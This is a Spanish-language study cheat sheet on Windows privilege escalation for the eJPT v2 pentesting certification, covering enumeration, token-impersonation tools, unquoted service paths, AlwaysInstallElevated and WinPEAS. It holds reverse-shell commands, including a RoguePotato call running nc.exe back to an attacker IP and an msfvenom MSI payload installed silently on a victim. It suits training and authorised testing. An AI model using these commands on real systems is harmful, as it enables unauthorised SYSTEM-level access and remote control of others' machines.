# Escalada de Privilegios en Windows (Guía eJPT v2)

Metodología de reconocimientos locales y vectores de escalada de privilegios en sistemas Windows adaptada al temario de eJPT v2.

---

## 1. Enumeración Manual Rápida

```cmd
:: Usuario actual y privilegios activos (Tokens)
whoami /priv
whoami /groups

:: Usuarios y grupos del sistema
net user
net localgroup administrators

:: Información del Sistema Operativo y Parches (Hotfixes)
systeminfo

:: Servicios en ejecución
tasklist /svc

:: Interfaces de red y tabla ARP
ipconfig /all
arp -a
netstat -ano
```

---

## 2. Abuso de Privilegios de Token (Impersonation Tokens)

Verifica si en `whoami /priv` tienes habilitado alguno de estos privilegios:

### `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`
Permite suplantar tokens de servicio para obtener privilegios de `NT AUTHORITY\SYSTEM`.

* **PrintSpoofer** (Windows 10 / Server 2016 / Server 2019):
  ```cmd
  PrintSpoofer.exe -i -c cmd.exe
  ```
* **JuicyPotato** (Windows 7 / 8 / Server 2008 R2 / Server 2012 R2):
  ```cmd
  JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
  ```
* **RoguePotato** / **SweetPotato**:
  ```cmd
  RoguePotato.exe -r <IP_ATACANTE> -e "C:\Windows\Tasks\nc.exe <IP_ATACANTE> 4444 -e cmd.exe"
  ```

---

## 3. Servicios con Permisos Débiles & Unquoted Service Paths

### Unquoted Service Paths (Rutas de Servicios sin Comillas)
Ocurre cuando la ruta del ejecutable de un servicio contiene espacios y no está entre comillas.

1. **Buscar servicios vulnerables**:
   ```cmd
   wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """
   ```
2. Si un servicio apunta a `C:\Program Files\My Service\service.exe`:
   * Windows intentará ejecutar `C:\Program.exe`, luego `C:\Program Files\My.exe`, y finalmente `C:\Program Files\My Service\service.exe`.
3. Si el usuario actual tiene permisos de escritura en `C:\Program Files\My Service\`, se puede subir un ejecutable malicioso nombrado `My.exe` y reiniciar el servicio:
   ```cmd
   sc stop "MyService"
   sc start "MyService"
   ```

---

## 4. AlwaysInstallElevated

Si la clave de registro `AlwaysInstallElevated` está habilitada, cualquier usuario puede instalar un paquete `.msi` con privilegios de SYSTEM.

1. **Comprobar si está habilitado**:
   ```cmd
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```
2. Si ambas claves devuelven `0x1`:
   * Generar un installer MSI con Msfvenom:
     ```bash
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f msi -o reverse.msi
     ```
   * Ejecutar la instalación silenciosa en la víctima:
     ```cmd
     msiexec /quiet /qn /i reverse.msi
     ```

---

## 5. Script Automatizado: WinPEAS

```cmd
:: Ejecutar WinPEAS bat/exe desde consola
winPEASbat.bat
winPEASx64.exe

:: Ejecutar script PowerShell PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

### En qué fijarse en el reporte de WinPEAS:
* **SeImpersonatePrivilege**
* **AutoLogon Passwords** (contraseñas guardadas en texto plano en el registro)
* **Unquoted Service Paths** y permisos de archivos `.exe` de servicios.
